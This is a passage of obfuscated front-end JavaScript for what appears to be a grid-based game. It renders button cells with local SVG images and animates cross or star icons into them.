                  _0x2c323e.style.opacity = '1';
                  _0x2c323e.style.transform = "scale(1)";
                });
              }
            } catch (_0x39450f) {
              const _0x53e153 = document.createElement("img");
              _0x53e153.style.cssText = "\n                                width: 56px;\n                                height: 56px;\n                                display: block;\n                                will-change: transform, opacity;\n                                opacity: 0;\n                                transform: scale(0);\n                                transition: opacity 0.3s, transform 0.3s;\n                            ";
              _0x53e153.src = _0x267f2f.has(_0x2ab2ec) ? "img/krest.svg" : "img/stars.svg";
              _0x4d6782.appendChild(_0x53e153);
              requestAnimationFrame(() => {
                _0x53e153.style.opacity = '1';
                _0x53e153.style.transform = "scale(1)";
              });
            }
            _0x4d6782.classList.remove("cell-fade-out");
            _0x5c8918();
          });
        })).then(() => {
          _0x5aad7e.disabled = false;
          if (_0x87c5da) {
            _0x87c5da = false;
          }
        });
      }
    });
  }
  function _0x9b1db7() {
    const _0x46a72c = ["output_svgs/image_5450.svg", "output_svgs/image_11641.svg", "output_svgs/image_18337.svg", "output_svgs/image_24493.svg", "output_svgs/image_31201.svg", "output_svgs/image_37357.svg", "output_svgs/image_44065.svg", "output_svgs/image_50221.svg", "output_svgs/image_56929.svg", "output_svgs/image_63085.svg", "output_svgs/image_69793.svg", "output_svgs/image_75949.svg", "output_svgs/image_82645.svg", "output_svgs/image_89353.svg", "output_svgs/image_95509.svg", "output_svgs/image_102217.svg", "output_svgs/image_108373.svg", "output_svgs/image_115081.svg", "output_svgs/image_121237.svg", "output_svgs/image_127381.svg", "output_svgs/image_134077.svg", "output_svgs/image_140221.svg", "output_svgs/image_146917.svg", "output_svgs/image_153061.svg", "output_svgs/image_159757.svg"];
    _0x46a72c.forEach(_0x2beef5 => {
      const _0x393b6b = document.createElement("button");
      _0x393b6b.type = "button";
      _0x393b6b.className = "cell";
      _0x393b6b.innerHTML = "<img width=\"56\" height=\"56\" src=\"" + _0x2beef5 + "\">";
      _0x3d5edc.appendChild(_0x393b6b);
    });
    _0x11ccbf();
  }
  _0x9b1db7();
});